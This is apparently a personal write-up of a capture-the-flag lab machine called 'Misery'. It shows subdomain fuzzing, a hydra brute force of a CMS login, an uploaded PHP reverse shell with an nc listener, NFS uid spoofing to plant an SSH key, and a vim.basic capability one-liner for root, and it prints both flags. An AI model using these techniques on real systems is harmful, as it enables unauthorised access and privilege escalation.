# Misery

## Enumeration
```bash
└─$ nmap -sV -A -p- -sC -T4 10.10.199.139 -oX nmap.out
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 00:33 BST
Nmap scan report for 10.10.199.139
Host is up (0.033s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp    open  http     Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://ohthemisery.thm
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
35471/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### At this point I was disapointed because I had found nothing so I check the subdomain (I nver do this before)

```bash
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://ohthemisery.thm' -H "Host:FUZZ.ohthemisery.thm" --hc 302 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ohthemisery.thm/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================

000009312:   200        94 L     359 W      4705 Ch     "lux"                                                
000006497:   200        79 L     359 W      4795 Ch     "vladimir"                                           
000004933:   200        58 L     216 W      3361 Ch     "vi"                                                 
000004804:   200        79 L     359 W      4858 Ch     "diana"                                              
000002956:   200        79 L     359 W      4732 Ch     "brand"                                              
000033678:   200        79 L     359 W      4753 Ch     "darius"                                             
000027112:   200        79 L     359 W      4705 Ch     "olaf"                                               
000020190:   200        79 L     359 W      4732 Ch     "annie"                                              
000019936:   200        79 L     359 W      4732 Ch     "poppy"                                              
000035705:   200        79 L     359 W      4753 Ch     "viktor"                                             
000037212:   400        12 L     53 W       422 Ch      "*"                                                  
000038253:   200        66 L     208 W      3402 Ch     "jinx" --> SUCCESS                                         
000044155:   200        79 L     359 W      4711 Ch     "gwen"                                               
000054512:   200        79 L     359 W      4772 Ch     "camille"                                            
000058129:   200        79 L     359 W      4753 Ch     "graves"                                             
000059348:   200        79 L     359 W      4711 Ch     "sion"                                               
000080504:   200        79 L     359 W      4690 Ch     "zac"                                                
000079252:   200        79 L     359 W      4711 Ch     "sona"
```

### The good subdomain was jinx and there were a cms service on it so I brute force it

## Exploitation

```bash
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt jinx.ohthemisery.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-03 19:38:21
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://jinx.ohthemisery.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[STATUS] 6598.00 tries/min, 6598 tries in 00:01h, 14337801 to do in 36:14h, 64 active
[STATUS] 6837.00 tries/min, 20511 tries in 00:03h, 14323888 to do in 34:56h, 64 active
[80][http-post-form] host: jinx.ohthemisery.thm   login: admin   password: canon
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-03 19:42:14
```
### Once connected, I upload the prentest-monkey.php reverse shell
```bash
nc -lnvp 4444
```
### I got a shell as jinx

## User FLAG

```cat user.txt``` : EPI{V0l4TIlE_expL05IVe2_r_4_9irL_8e5T_PHriENd!}

## Privilege Escalation
### I follow a write up and I did something really cursed to get a shell as another user

```bash
└─$ sudo adduser jinx --home /home/jinx --shell /bin/bash --uid 6666

mount -t nfs :/home/jinx /mountpoint

ssh-keygen jinx -f

cat key.pub > .ssh/authorized_keys
```
### Reverse the binary "hex" for read the vi ssh private key

### Connect with it -> linpeas -> vim.basic capabilities
```bash
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 
cd /root
```
## Root FLAG

```cat `ls` ```: = EPI{0H_wA17_n0_7h3R3_12_jU57_73h_harD_WaY}



